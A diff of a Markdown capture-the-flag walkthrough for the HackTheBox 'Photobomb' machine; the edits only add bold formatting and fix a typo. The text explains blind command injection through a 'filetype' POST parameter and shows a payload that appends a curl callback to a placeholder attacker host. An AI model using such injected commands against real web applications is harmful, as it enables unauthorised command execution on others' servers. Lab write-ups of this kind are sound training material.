@@ -50,14 +50,14 @@ We now have access to the `/printer` directory. The web application allows us to
 
 ![image](/HTB/Photobomb/Photobomb_images/8.png)
 
-The application relies on three POST parameters to process the request:
+The application relies on three **POST parameters** to process the request:
  `photo`, `filetype`, `dimensions`.
 
 ## Initial Access
 
-One of these parameters is vulnerable to **blind command injection**: the `filetype` parameter. By injecting a semicolon (`;`) into the `filetype` parameter, we can append arbitrary system commands, leading to command injection.
+One of these parameters is vulnerable to **blind command injection**: the `filetype` parameter. By injecting a **semicolon** (`;`) into the `filetype` parameter, we can append **arbitrary system commands**, leading to command injection.
 
-Although the web application response doesn’t indicate whether our command has been executed, we can test directly if the target can reach our local machine by setting up a Python server (via `python3 -m http.server PORT`) and sending the following payload in the `filetype` parameter to make anHTTP request:
+Although the web application response doesn’t indicate whether our command has been executed, we can test directly if the target can reach our local machine by setting up a **Python server** (via `python3 -m http.server PORT`) and sending the following payload in the `filetype` parameter to make an HTTP request:
 
 `;curl+http://ATTACKER_IP:PYTHON_PORT`
 
